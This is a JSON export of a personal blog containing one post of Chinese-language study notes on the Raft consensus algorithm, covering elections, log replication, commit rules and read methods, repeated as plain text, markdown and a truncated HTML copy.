{"meta":{"title":"H-ZeX","subtitle":"H-ZeX's Coding Life","description":null,"author":"H-ZeX","url":"https://h-zex.github.io"},"pages":[{},{},{},{},{},{}],"posts":[{"title":"My Raft Log","date":"2019-08-03T15:28:21.000Z","path":"2019/08/03/my-raft-log/","text":"Raft参考 raft-zh_cn 蚂蚁金服开源 SOFAJRaft：生产级 Java Raft 算法库 Overview 共识是多个参与者针对某一件事达成完全一致。已达成一致的结论，不可推翻（领导人绝不删除或覆盖自己的日志，only append，并且领导人的日志绝对正确） 复制状态机通常基于复制日志实现。因为每个状态机都是确定的，所以每一次执行操作都产生相同的状态和相同的序列。一旦指令被正确的复制，每一个服务器的状态机按照日志顺序处理他们，然后输出结果被返回给客户端。因此，服务器集群看起来形成一个高可靠的状态机。保持日志的相同就是共识算法的工作了 Raft可以提供以下特性 安全：在非拜占庭错误情况下，包括网络延迟、分区、丢包、冗余和乱序等错误都可以保证正确 可用：大多数机器work那么该集群就work，宕机的节点当有稳定的存储的时候可以从状态中恢复回来并重新加入集群 不依赖时序来保证一致性: 物理时钟错误或者极端的消息延迟只有在最坏情况下才会导致可用性问题 集群的响应速度取决于最快的大部分机器 作用 在低可靠的普通x86服务器上构建一个高可靠的整体，使得即使有少部分机器宕机，集群依然可用（当然选举的过程中集群是不可用的） 普通服务器具有良好的性价比，因此在互联网等行业得到了广泛的应用。但普通服务器也不得不面对2%-4%的年故障率([1])，于是必须高可用的传统数据库只得很悲催地使用性价比低得可怜的高可靠服务器。分布式一致性协议（distributed consensus protocol）是迄今为止最有效的解决服务器不可靠问题的途径，因为它使得一组服务器形成一个相互协同的系统，从而当其中部分服务器故障后，整个系统也能够继续工作(Ref from) 通过支持follower read使得对于读请求可以负载均衡 主要特点 strong leader：选举领导人，然后给予他全部的管理复制日志的责任来实现一致性。领导人从客户端接收日志条目，把日志条目复制到其他服务器上，并且当保证安全性的时候告诉其他的服务器应用日志条目到他们的状态机中 保证以下特性 选举安全：给定一个term，必有一个leader被选举出来 领导人绝不删除或覆盖自己的日志，only append 如果两个日志在相同的索引位置的日志条目的任期号相同，那么我们就认为这个日志从头到这个索引位置之间全部完全相同 leader完全特性：如果某个日志条目在某个任期号中已经被提交，那么这个条目必然出现在更大任期号的所有领导人中（5.4 节） 如果一个领导人已经在给定的索引值位置的日志条目应用到状态机中，那么其他任何的服务器在这个索引位置不会提交一个不同的日志 服务器状态 在所有服务器上持久化的 server最后一次知道的任期号（初始为0，单调递增） votedFor 获得选票的候选人ID（之所以需要持久化，是为了避免投票过程中宕机，导致宕机前后投了两次票，从而使得选举的“唯一领导人”特性被破坏） 日志条目list（每个日志条目包含一个用户状态机执行的指令、收到时的任期号，每个日志条目在该list中的index是日志索引位置？） 在所有服务器中经常变的 已知的最大的已经被提交的日志条目的索引值 最后被应用到状态机的日志条目索引值(初始化为 0,持续递增) 在领导人里经常改变的 (选举后重新初始化) 对于每一个服务器,需要发送给他的下一个日志条目的索引值(初始化为领导人最后索引值加一) 对于每一个服务器,已经复制给他的日志的最高索引值 任期 任期在 Raft 算法中充当逻辑时钟的作用，这会允许服务器节点查明一些过期的信息比如陈旧的领导者 每一个节点存储一个当前任期号，这一编号在整个时期内单调的增长 当服务器之间通信的时候会交换当前任期号 如果一个服务器的当前任期号比其他人小，那么他会更新自己的编号到较大的编号值 如果一个候选人或者领导者发现自己的任期号过期了，那么他会立即恢复成跟随者状态。如果一个节点接收到一个包含过期的任期号的请求，那么他会直接拒绝这个请求 任期号是单调递增的： 新leader的任期号一定比旧的任期号大。旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选 选举 最开始启动时，server以follower的身份启动 如果超时没有收到心跳（选举超时，通常是100ms~500ms，每台服务器都会随机的计算下次超时的间隔时间，这个时间间隔在[T, 2T]之间。T代表着选举超时的时间，即服务器可能出现超时的最短时间）。那么进入选举过程 拉票过程 变为candidate 增大任期号（所以旧的leader复活也不能恢复旧时代） 投票给自己、发拉票rpc给所有其他人（不断重试直到收到响应）直到成为leader/收到心跳/超时从而重试 一旦候选人赢得选举，他就立即成为领导人。然后他会向其他的服务器发送心跳消息来建立自己的权威并且阻止新的领导人的产生 等待投票的时候，候选人可能会从其他的服务器接收到声明它是领导人的附加日志项RPC。如果这个领导人的任期号（包含在此次的 RPC中）不小于候选人当前的任期号，那么候选人会承认领导人合法并回到跟随者状态。 如果此次RPC中的任期号比自己小，那么候选人就会拒绝这次的RPC并且继续保持候选人状态 出现分票时，每一个候选人都会超时，然后通过增加当前任期号来开始一轮新的选举 通过以下手段使得不会无限分票 广播时间（广播时间指的是从一个服务器并行的发送 RPCs 给集群中的其他服务器并接收响应的平均时间）必须比选举超时时间小一个量级,这样领导人才能够发送稳定的心跳消息来阻止跟随者开始进入选举状态 随机化超时时间 拉票RPC包括：候选人的任期号、候选人的id、候选人的最后日志条目的索引值、候选人最后日志条目的任期号 一个问题，索引值和任期号相同，那么日志内容就一定相同吗？ 我认为 因为数据都从领导人流向其他服务器，所以某服务器在该位置上有这样一条这个任期号的日志，必然是因为有这个任期号的leader传给它的，而领导人绝不删除或覆盖自己的日志，所以日志内容是确定的 如果出现该leader还没有comment该日志就下台，也不会出问题，因为新的leader的任期号必然比旧leader的大 投票过程 每一个服务器最多会对一个任期号投出一张选票，按照先来先服务的原则 RPC 中包含了候选人的日志信息,然后投票人会拒绝掉那些日志没有自己新的投票请求。（“新的”定义：(lastterm_me &lt; lastterm_ca || (lastterm_me == lastterm_ca &amp;&amp; lastindex_me &lt;= lastindex_ca))） 拉票时，通过日志的完整、新旧程度来判断是否投票给某候选人，所以即使某服务器已收到term-4的leader发来的term-2的log，其还是会将票投给term-3的候选人（这样导致了“新leader复制旧日志使之分布到大多数node上时依然不能提交”） 安全：保证某任期一定有一个leader，方法是保证某次投票只投给一人，所以需要server持久化自己的投票信息，保证不重复投票 可用：保证一定会选出leader。通过随机化超时时间来保证 Raft使用投票的方式来阻止一个候选人赢得选举除非这个候选人包含了所有已经提交的日志条目。候选人为了赢得选举必须联系集群中的大部分节点,这意味着每一个已经提交的日志条目在这些服务器节点中肯定存在于至少一个节点上。如果候选人的日志至少和大多数的服务器节点一样新, 那么他一定持有了所有已经提交的日志条目 新leader的任期号一定比旧的任期号大：旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选 日志 每台server都有日志副本 日志被分为多条记录（entries），由下标索引唯一标示 记录包含：一条命令、任期号（该记录创建时，leader的任期号，单调上升） 如果日志是已提交的，则可以安全的传递给状态机去执行 日志的索引和任期号的组合可以唯一标示一条日志记录 发起追加日志调用时，除了新创建的新日志记录，还包括当前新记录的index和term号。从而通过数学归纳法保证如果某entries与leader的该entries是相同的，那么这条记录之前的所有记录都是匹配的 附加日志RPC中包含leader的commitIdx，follower把自己的commitIdx更新为leader的commitIdx与自己的日志Idx中较小的一个。并且在commitIdx大于自己的lastApplyIdx时apply日志 一致性检查：如果日志在 prevLogIndex 位置处的日志条目的任期号和 prevLogTerm 不匹配,则返回false。如果已经存在的日志条目和新的产生冲突(索引值相同但是任期号不同),删除这一条和之后所有的 利用RPC一致性检查，就可以使得follower与leader的日志逐渐趋同——leader会在一致性检查失败时重试，使得最终nextIndex在某个位置leader与follower的日志达成一致 一致性检查就像一个归纳步骤: 一开始空的日志状态肯定是满足日志匹配特性的, 然后一致性检查保护了日志匹配特性当日志扩展的时候。 领导人崩溃的情况会使得日志处于不一致的状态(老的领导人可能还没有完全复制所有的日志条目)。这种不一致问题会在领导人和跟随者的一系列崩溃下加剧 领导人处理不一致是通过强制跟随者直接复制自己的日志来解决了。这意味着在跟随者中的冲突的日志条目会被领导人的日志覆盖 如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录 当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号 日志提交 领导人来决定什么时候把日志条目应用到状态机中是安全的；这种日志条目被称为已提交 在领导人将创建的日志条目复制到大多数的服务器上的时候，日志条目就会被提交 同时，领导人的日志中之前的所有日志条目也都会被提交，包括由其他领导人创建的条目 需要限制 这一限制保证了任何的领导人对于给定的任期号，都拥有了之前任期的所有被提交的日志条目 Raft永远不会通过计算副本数目的方式去提交一个之前任期内的日志条目。只有领导人当前任期里的日志条目通过计算副本数目可以被提交；一旦当前任期的日志条目以这种方式被提交，那么由于日志匹配特性，之前的日志条目也都会被间接的提交 服务过程 客户端的每一个请求都包含一条被复制状态机执行的指令 领导人把这条指令作为一条新的日志条目附加到日志中去，然后并行的发起附加条目 RPCs 给其他的服务器，让他们复制这条日志条目 这条日志条目被安全的复制，领导人会应用这条日志条目到它的状态机中然后把执行的结果返回给客户端 如果跟随者崩溃或者运行缓慢，再或者网络丢包，领导人会不断的重复尝试附加日志条目 RPCs （尽管已经回复了客户端）直到所有的跟随者都最终存储了所有的日志条目。 可用性 选举超时时间应该要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定的运行。当领导人崩溃后，整个系统会大约相当于选举超时的时间里不可用 安全性 如果有任何的服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令 覆盖日志的风险 如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录 当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号 所以如果某条前任的日志被当前leader复制到大多数机器上，另外的机器（没有这条日志）依然有可能被选为leader，因为该server的日志可以被老日志新（虽然比当前leader老）（论文中的图8） 解决方法：一个领导人不能断定一个之前任期里的日志条目被保存到大多数服务器上的时候就一定已经提交了。一旦当前任期的日志条目以这种方式被提交,那么由于日志匹配特性，之前的日志条目也都会被间接的提交。在某些情况下，领导人可以安全的知道一个老的日志条目是否已经被提交(例如，该条目是否存储到所有服务器上） Raft读取 Ref from 方法一：就像写入一样，走一遍raft log，这个log commit、apply后就可能拿到最新的值了 方法二：ReadIndex Read 将当前⾃⼰的 commit index 记录到⼀个 local 变量 ReadIndex ⾥⾯ 我的想法：对于用户来说，只能期待写入后的读取读到“刚刚写入的值”，而不能期待读到“读取时写入的值”。所以即使保存该commit index后有新的写入到来，commit index增大，依然没有问题（TODO，待求证） 向其他节点发起⼀次 heartbeat，如果⼤多数节点返回了对应的 heartbeat response，那么 leader 就能够确定现在⾃⼰仍然是 leader Leader 等待⾃⼰的状态机执⾏，直到 apply index 超过了 ReadIndex，这样就能够安全的提供 linearizable read 了 Leader 执⾏ read 请求，将结果返回给 client corner case leader 刚通过选举成为 leader 的时候，这时候的 commit index 并不能够保证是当前整个系统最新的 commit index Raft要求当 leader 选举成功之后，⾸先提交⼀个 no-op 的 entry，保证leader 的 commit index 成为最新的 因为 leader 在选举成功之后，term ⼀定会增加，在处理 ReadIndex 的时候，如果当前最新的 commit log 的 term 还没到新的 term，就会⼀直等待跟新的 term ⼀致，也就是 no-op entry 提交之后，才可以对外处理ReadIndex（幸好有一个no-op的写入，不然这个读就得等到有新的写入完成才能读取成功） 方法三：Lease Read leader 发送 heartbeat 的时候，会⾸先记录⼀个时间点 start，当系统⼤部分节点都回复了 heartbeat response，那么我们就可以认为 leader 的 lease 有效期可以到 start + election timeout / clock drift bound 这个时间点 主要是在于 Raft 的选举机制，因为 follower 会在⾄少election timeout 的时间之后，才会重新发⽣选举，所以下⼀个 leader 选出来的时间⼀定可以保证⼤于 start + election timeout / clock drift bound 面临风险：CPU时间不准从而出错 需要可靠硬盘 需要可靠保存任期号 保证某次选举时只将票投给一个server（如果没有可靠保存任期号，则有可能在选举过程中宕机又恢复的server会两次投票——一次宕机前，一次恢复后） 需要可靠保存日志 我认为，“需要可靠硬盘”与“硬盘可以损坏”并不冲突，因为我们在硬盘下线后上线时，可以使用checksum等工具，来判定硬盘是否损坏，如果损坏，那么不让其上线即可 优化 当附加日志RPC的请求被拒绝的时候（因为一致性检查失败），跟随者可以包含冲突的条目的任期号和自己存储的那个任期的最早的索引地址。借助这些信息,领导人可以减小 nextIndex越过所有那个任期冲突的所有日志条目;这样就变成每个任期需要一次附加条目 RPC 而不是每个条目一次 follower read （TODO） 具体情况分析 某server一直收不到回复，从而假定出现分票，从而新开一个任期来选举，而他刚开始选举时，就收到上一次投票时的获胜者的心跳，会发生什么？ 因为对于心跳RPC，如果term &lt; currentTerm就返回 false，并且心跳RPC的返回值有这个follower的当前任期号，所以leader会成为follower 如果接收到的RPC请求或响应中，任期号T&gt;currentTerm，那么就令currentTerm等于T，并切换状态为跟随者 只是这里有一个问题，候选人收到心跳RPC也是按照follower那样回复吗，论文上的表述是“接收者实现:”，而不是“follower实现”（第5节开头时关于附加日志RPC的介绍那里） 如何获得全局有效的任期号？这是个坏的问题。 问题 如果心跳收不到响应怎么办？论文中没有提到","raw":"---\ntitle: My Raft Log\ndate: 2019-08-03 23:28:21\ntags:\n- Raft\n- 共识算法\n- 分布式\ncategories:\n- 分布式\n- 算法\n---\n\n### Raft\n\n##### 参考\n\n- [raft-zh_cn](https://github.com/maemual/raft-zh_cn)\n- [蚂蚁金服开源 SOFAJRaft：生产级 Java Raft 算法库](https://www.yuque.com/huarou/gd4szw/zon6t9)\n\n##### Overview \n\n- 共识是多个参与者针对某一件事达成完全一致。已达成一致的结论，不可推翻（领导人绝不删除或覆盖自己的日志，only append，并且领导人的日志绝对正确）\n- 复制状态机通常基于复制日志实现。因为每个状态机都是确定的，所以每一次执行操作都产生相同的状态和相同的序列。一旦指令被正确的复制，每一个服务器的状态机按照日志顺序处理他们，然后输出结果被返回给客户端。因此，服务器集群看起来形成一个高可靠的状态机。保持日志的相同就是共识算法的工作了\n- Raft可以提供以下特性\n   - 安全：在非拜占庭错误情况下，包括网络延迟、分区、丢包、冗余和乱序等错误都可以保证正确\n   - 可用：大多数机器work那么该集群就work，宕机的节点当有稳定的存储的时候可以从状态中恢复回来并重新加入集群\n   - 不依赖时序来保证一致性: 物理时钟错误或者极端的消息延迟只有在最坏情况下才会导致可用性问题\n   - 集群的响应速度取决于最快的大部分机器\n- 作用\n   - 在低可靠的普通x86服务器上构建一个高可靠的整体，使得即使有少部分机器宕机，集群依然可用（当然选举的过程中集群是不可用的）\n      > 普通服务器具有良好的性价比，因此在互联网等行业得到了广泛的应用。但普通服务器也不得不面对2%-4%的年故障率([1])，于是必须高可用的传统数据库只得很悲催地使用性价比低得可怜的高可靠服务器。分布式一致性协议（distributed consensus protocol）是迄今为止最有效的解决服务器不可靠问题的途径，因为它使得一组服务器形成一个相互协同的系统，从而当其中部分服务器故障后，整个系统也能够继续工作([Ref from](https://www.zhihu.com/question/52337912/answer/131507725))\n   - 通过支持follower read使得对于读请求可以负载均衡\n\n##### 主要特点\n\n- strong leader：选举领导人，然后给予他全部的管理复制日志的责任来实现一致性。领导人从客户端接收日志条目，把日志条目复制到其他服务器上，并且当保证安全性的时候告诉其他的服务器应用日志条目到他们的状态机中\n- 保证以下特性\n   - 选举安全：给定一个term，必有一个leader被选举出来\n   - 领导人绝不删除或覆盖自己的日志，only append\n   - 如果两个日志在相同的索引位置的日志条目的任期号相同，那么我们就认为这个日志从头到这个索引位置之间全部完全相同\n   - leader完全特性：如果某个日志条目在某个任期号中已经被提交，那么这个条目必然出现在更大任期号的所有领导人中（5.4 节）\n   - 如果一个领导人已经在给定的索引值位置的日志条目应用到状态机中，那么其他任何的服务器在这个索引位置不会提交一个不同的日志\n\n##### 服务器状态\n\n- 在所有服务器上持久化的\n   - server最后一次知道的任期号（初始为0，单调递增）\n   - votedFor 获得选票的候选人ID（之所以需要持久化，是为了避免投票过程中宕机，导致宕机前后投了两次票，从而使得选举的“唯一领导人”特性被破坏）\n   - 日志条目list（每个日志条目包含一个用户状态机执行的指令、收到时的任期号，每个日志条目在该list中的index是日志索引位置？）\n- 在所有服务器中经常变的 \n   - 已知的最大的已经被提交的日志条目的索引值\n   - 最后被应用到状态机的日志条目索引值(初始化为 0,持续递增)\n- 在领导人里经常改变的 (选举后重新初始化)\n   - 对于每一个服务器,需要发送给他的下一个日志条目的索引值(初始化为领导人最后索引值加一)\n   - 对于每一个服务器,已经复制给他的日志的最高索引值\n\n##### 任期\n\n- 任期在 Raft 算法中充当逻辑时钟的作用，这会允许服务器节点查明一些过期的信息比如陈旧的领导者\n- 每一个节点存储一个当前任期号，这一编号在整个时期内单调的增长\n- 当服务器之间通信的时候会交换当前任期号\n- 如果一个服务器的当前任期号比其他人小，那么他会更新自己的编号到较大的编号值\n- 如果一个候选人或者领导者发现自己的任期号过期了，那么他会立即恢复成跟随者状态。如果一个节点接收到一个包含过期的任期号的请求，那么他会直接拒绝这个请求\n- 任期号是单调递增的： 新leader的任期号一定比旧的任期号大。旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选\n\n##### 选举\n\n- 最开始启动时，server以follower的身份启动\n- 如果超时没有收到心跳（选举超时，通常是100ms~500ms，每台服务器都会随机的计算下次超时的间隔时间，这个时间间隔在`[T, 2T]`之间。T代表着选举超时的时间，即服务器可能出现超时的最短时间）。那么进入选举过程\n- 拉票过程\n   - 变为candidate\n   - 增大任期号（所以旧的leader复活也不能恢复旧时代）\n   - 投票给自己、发拉票rpc给所有其他人（不断重试直到收到响应）直到成为leader/收到心跳/超时从而重试\n   - 一旦候选人赢得选举，他就立即成为领导人。然后他会向其他的服务器发送心跳消息来建立自己的权威并且阻止新的领导人的产生\n   - 等待投票的时候，候选人可能会从其他的服务器接收到声明它是领导人的附加日志项RPC。如果这个领导人的任期号（包含在此次的 RPC中）不小于候选人当前的任期号，那么候选人会承认领导人合法并回到跟随者状态。 如果此次RPC中的任期号比自己小，那么候选人就会拒绝这次的RPC并且继续保持候选人状态\n   - 出现分票时，每一个候选人都会超时，然后通过增加当前任期号来开始一轮新的选举\n   - 通过以下手段使得不会无限分票\n      - 广播时间（广播时间指的是从一个服务器并行的发送 RPCs 给集群中的其他服务器并接收响应的平均时间）必须比选举超时时间小一个量级,这样领导人才能够发送稳定的心跳消息来阻止跟随者开始进入选举状态\n      - 随机化超时时间 \n- 拉票RPC包括：候选人的任期号、候选人的id、候选人的最后日志条目的索引值、候选人最后日志条目的任期号\n   - 一个问题，索引值和任期号相同，那么日志内容就一定相同吗？\n   - 我认为\n      - 因为数据都从领导人流向其他服务器，所以某服务器在该位置上有这样一条这个任期号的日志，必然是因为有这个任期号的leader传给它的，而领导人绝不删除或覆盖自己的日志，所以日志内容是确定的\n      - 如果出现该leader还没有comment该日志就下台，也不会出问题，因为新的leader的任期号必然比旧leader的大\n- 投票过程\n   - 每一个服务器最多会对一个任期号投出一张选票，按照先来先服务的原则\n   - RPC 中包含了候选人的日志信息,然后投票人会拒绝掉那些日志没有自己新的投票请求。（“新的”定义：(`lastterm_me < lastterm_ca || (lastterm_me == lastterm_ca && lastindex_me <= lastindex_ca))`）\n   - 拉票时，通过日志的完整、新旧程度来判断是否投票给某候选人，所以即使某服务器已收到term-4的leader发来的term-2的log，其还是会将票投给term-3的候选人（这样导致了“新leader复制旧日志使之分布到大多数node上时依然不能提交”）\n- 安全：保证某任期一定有一个leader，方法是保证某次投票只投给一人，所以需要server持久化自己的投票信息，保证不重复投票\n- 可用：保证一定会选出leader。通过随机化超时时间来保证\n- Raft使用投票的方式来阻止一个候选人赢得选举除非这个候选人包含了所有已经提交的日志条目。候选人为了赢得选举必须联系集群中的大部分节点,这意味着每一个已经提交的日志条目在这些服务器节点中肯定存在于至少一个节点上。如果候选人的日志至少和大多数的服务器节点一样新, 那么他一定持有了所有已经提交的日志条目\n- 新leader的任期号一定比旧的任期号大：旧leader得到有大部分server的支持，所以大部分server上持久化的leader任期号必然等于旧leader的，所以一个跟旧leader任期号相同或更小的server必然不可能当选\n\n\n##### 日志\n\n- 每台server都有日志副本\n- 日志被分为多条记录（entries），由下标索引唯一标示\n- 记录包含：一条命令、任期号（该记录创建时，leader的任期号，单调上升）\n- 如果日志是已提交的，则可以安全的传递给状态机去执行\n- 日志的索引和任期号的组合可以唯一标示一条日志记录\n- 发起追加日志调用时，除了新创建的新日志记录，还包括当前新记录的index和term号。从而通过数学归纳法保证如果某entries与leader的该entries是相同的，那么这条记录之前的所有记录都是匹配的\n- 附加日志RPC中包含leader的commitIdx，follower把自己的commitIdx更新为leader的commitIdx与自己的日志Idx中较小的一个。并且在commitIdx大于自己的lastApplyIdx时apply日志\n- 一致性检查：如果日志在 prevLogIndex 位置处的日志条目的任期号和 prevLogTerm 不匹配,则返回false。如果已经存在的日志条目和新的产生冲突(索引值相同但是任期号不同),删除这一条和之后所有的\n- 利用RPC一致性检查，就可以使得follower与leader的日志逐渐趋同——leader会在一致性检查失败时重试，使得最终nextIndex在某个位置leader与follower的日志达成一致\n- 一致性检查就像一个归纳步骤: 一开始空的日志状态肯定是满足日志匹配特性的, 然后一致性检查保护了日志匹配特性当日志扩展的时候。\n- 领导人崩溃的情况会使得日志处于不一致的状态(老的领导人可能还没有完全复制所有的日志条目)。这种不一致问题会在领导人和跟随者的一系列崩溃下加剧\n- 领导人处理不一致是通过强制跟随者直接复制自己的日志来解决了。这意味着在跟随者中的冲突的日志条目会被领导人的日志覆盖\n- 如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录\n- 当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号\n-  日志提交\n   - 领导人来决定什么时候把日志条目应用到状态机中是安全的；这种日志条目被称为已提交\n   - 在领导人将创建的日志条目复制到大多数的服务器上的时候，日志条目就会被提交\n   - 同时，领导人的日志中之前的所有日志条目也都会被提交，包括由其他领导人创建的条目\n- 需要限制\n   - 这一限制保证了任何的领导人对于给定的任期号，都拥有了之前任期的所有被提交的日志条目\n   - Raft永远不会通过计算副本数目的方式去提交一个之前任期内的日志条目。只有领导人当前任期里的日志条目通过计算副本数目可以被提交；一旦当前任期的日志条目以这种方式被提交，那么由于日志匹配特性，之前的日志条目也都会被间接的提交\n\n##### 服务过程\n\n- 客户端的每一个请求都包含一条被复制状态机执行的指令\n- 领导人把这条指令作为一条新的日志条目附加到日志中去，然后并行的发起附加条目 RPCs 给其他的服务器，让他们复制这条日志条目\n- 这条日志条目被安全的复制，领导人会应用这条日志条目到它的状态机中然后把执行的结果返回给客户端\n- 如果跟随者崩溃或者运行缓慢，再或者网络丢包，领导人会不断的重复尝试附加日志条目 RPCs （尽管已经回复了客户端）直到所有的跟随者都最终存储了所有的日志条目。\n\n##### 可用性\n\n- 选举超时时间应该要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定的运行。当领导人崩溃后，整个系统会大约相当于选举超时的时间里不可用\n\n##### 安全性\n\n- 如果有任何的服务器节点已经应用了一个确定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一个不同的指令\n- 覆盖日志的风险\n   - 如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录\n   - 当领导人复制之前任期里的日志时,Raft会为所有日志保留原始的任期号\n   - 所以如果某条前任的日志被当前leader复制到大多数机器上，另外的机器（没有这条日志）依然有可能被选为leader，因为该server的日志可以被老日志新（虽然比当前leader老）（论文中的图8）\n   - 解决方法：一个领导人不能断定一个之前任期里的日志条目被保存到大多数服务器上的时候就一定已经提交了。一旦当前任期的日志条目以这种方式被提交,那么由于日志匹配特性，之前的日志条目也都会被间接的提交。在某些情况下，领导人可以安全的知道一个老的日志条目是否已经被提交(例如，该条目是否存储到所有服务器上）\n\n##### Raft读取\n\n- [Ref from](https://pingcap.com/blog-cn/lease-read/)\n- 方法一：就像写入一样，走一遍raft log，这个log commit、apply后就可能拿到最新的值了\n- 方法二：ReadIndex Read\n   - 将当前⾃⼰的 commit index 记录到⼀个 local 变量 ReadIndex ⾥⾯\n      - 我的想法：对于用户来说，只能期待写入后的读取读到“刚刚写入的值”，而不能期待读到“读取时写入的值”。所以即使保存该commit index后有新的写入到来，commit index增大，依然没有问题（TODO，待求证）\n   - 向其他节点发起⼀次 heartbeat，如果⼤多数节点返回了对应的 heartbeat response，那么 leader 就能够确定现在⾃⼰仍然是 leader\n   - Leader 等待⾃⼰的状态机执⾏，直到 apply index 超过了 ReadIndex，这样就能够安全的提供 linearizable read 了\n   - Leader 执⾏ read 请求，将结果返回给 client\n   - corner case\n      - leader 刚通过选举成为 leader 的时候，这时候的 commit index 并不能够保证是当前整个系统最新的 commit index\n      - Raft要求当 leader 选举成功之后，⾸先提交⼀个 no-op 的 entry，保证leader 的 commit index 成为最新的\n      - 因为 leader 在选举成功之后，term ⼀定会增加，在处理 ReadIndex 的时候，如果当前最新的 commit log 的 term 还没到新的 term，就会⼀直等待跟新的 term ⼀致，也就是 no-op entry 提交之后，才可以对外处理ReadIndex（幸好有一个no-op的写入，不然这个读就得等到有新的写入完成才能读取成功）\n- 方法三：Lease Read\n   - leader 发送 heartbeat 的时候，会⾸先记录⼀个时间点 start，当系统⼤部分节点都回复了 heartbeat response，那么我们就可以认为 leader 的 lease 有效期可以到 start + election timeout / clock drift bound 这个时间点\n   - 主要是在于 Raft 的选举机制，因为 follower 会在⾄少election timeout 的时间之后，才会重新发⽣选举，所以下⼀个 leader 选出来的时间⼀定可以保证⼤于 start + election timeout / clock drift bound \n   - 面临风险：CPU时间不准从而出错\n\n##### 需要可靠硬盘\n\n- 需要可靠保存任期号\n- 保证某次选举时只将票投给一个server（如果没有可靠保存任期号，则有可能在选举过程中宕机又恢复的server会两次投票——一次宕机前，一次恢复后）\n- 需要可靠保存日志\n- 我认为，“需要可靠硬盘”与“硬盘可以损坏”并不冲突，因为我们在硬盘下线后上线时，可以使用checksum等工具，来判定硬盘是否损坏，如果损坏，那么不让其上线即可\n\n##### 优化\n\n- 当附加日志RPC的请求被拒绝的时候（因为一致性检查失败），跟随者可以包含冲突的条目的任期号和自己存储的那个任期的最早的索引地址。借助这些信息,领导人可以减小 nextIndex越过所有那个任期冲突的所有日志条目;这样就变成每个任期需要一次附加条目 RPC 而不是每个条目一次\n- follower read （TODO）\n\n##### 具体情况分析\n\n- 某server一直收不到回复，从而假定出现分票，从而新开一个任期来选举，而他刚开始选举时，就收到上一次投票时的获胜者的心跳，会发生什么？\n   - 因为对于心跳RPC，如果term < currentTerm就返回 false，并且心跳RPC的返回值有这个follower的当前任期号，所以leader会成为follower\n      > 如果接收到的RPC请求或响应中，任期号T>currentTerm，那么就令currentTerm等于T，并切换状态为跟随者\n   - 只是这里有一个问题，候选人收到心跳RPC也是按照follower那样回复吗，论文上的表述是“接收者实现:”，而不是“follower实现”（第5节开头时关于附加日志RPC的介绍那里）\n- 如何获得全局有效的任期号？这是个坏的问题。\n\n##### 问题\n\n- 如果心跳收不到响应怎么办？论文中没有提到\n","content":"<h3 id=\"Raft\"><a href=\"#Raft\" class=\"headerlink\" title=\"Raft\"></a>Raft</h3><h5 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h5><ul>\n<li><a href=\"https://github.com/maemual/raft-zh_cn\" target=\"_blank\" rel=\"noopener\">raft-zh_cn</a></li>\n<li><a href=\"https://www.yuque.com/huarou/gd4szw/zon6t9\" target=\"_blank\" rel=\"noopener\">蚂蚁金服开源 SOFAJRaft：生产级 Java Raft 算法库</a></li>\n</ul>\n<h5 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h5><ul>\n<li>共识是多个参与者针对某一件事达成完全一致。已达成一致的结论，不可推翻（领导人绝不删除或覆盖自己的日志，only append，并且领导人的日志绝对正确）</li>\n<li>复制状态机通常基于复制日志实现。因为每个状态机都是确定的，所以每一次执行操作都产生相同的状态和相同的序列。一旦指令被正确的复制，每一个服务器的状态机按照日志顺序处理他们，然后输出结果被返回给客户端。因此，服务器集群看起来形成一个高可靠的状态机。保持日志的相同就是共识算法的工作了</li>\n<li>Raft可以提供以下特性<ul>\n<li>安全：在非拜占庭错误情况下，包括网络延迟、分区、丢包、冗余和乱序等错误都可以保证正确</li>\n<li>可用：大多数机器work那么该集群就work，宕机的节点当有稳定的存储的时候可以从状态中恢复回来并重新加入集群</li>\n<li>不依赖时序来保证一致性: 物理时钟错误或者极端的消息延迟只有在最坏情况下才会导致可用性问题</li>\n<li>集群的响应速度取决于最快的大部分机器</li>\n</ul>\n</li>\n<li>作用<ul>\n<li>在低可靠的普通x86服务器上构建一个高可靠的整体，使得即使有少部分机器宕机，集群依然可用（当然选举的过程中集群是不可用的）<blockquote>\n<p>普通服务器具有良好的性价比，因此在互联网等行业得到了广泛的应用。但普通服务器也不得不面对2%-4%的年故障率([1])，于是必须高可用的传统数据库只得很悲催地使用性价比低得可怜的高可靠服务器。分布式一致性协议（distributed consensus protocol）是迄今为止最有效的解决服务器不可靠问题的途径，因为它使得一组服务器形成一个相互协同的系统，从而当其中部分服务器故障后，整个系统也能够继续工作(<a href=\"https://www.zhihu.com/question/52337912/answer/131507725\" target=\"_blank\" rel=\"noopener\">Ref from</a>)</p>\n</blockquote>\n</li>\n<li>通过支持follower read使得对于读请求可以负载均衡</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"主要特点\"><a href=\"#主要特点\" class=\"headerlink\" title=\"主要特点\"></a>主要特点</h5><ul>\n<li>strong leader：选举领导人，然后给予他全部的管理复制日志的责任来实现一致性。领导人从客户端接收日志条目，把日志条目复制到其他服务器上，并且当保证安全性的时候告诉其他的服务器应用日志条目到他们的状态机中</li>\n<li>保证以下特性<ul>\n<li>选举安全：给定一个term，必有一个leader被选举出来</li>\n<li>领导人绝不删除或覆盖自己的日志，only 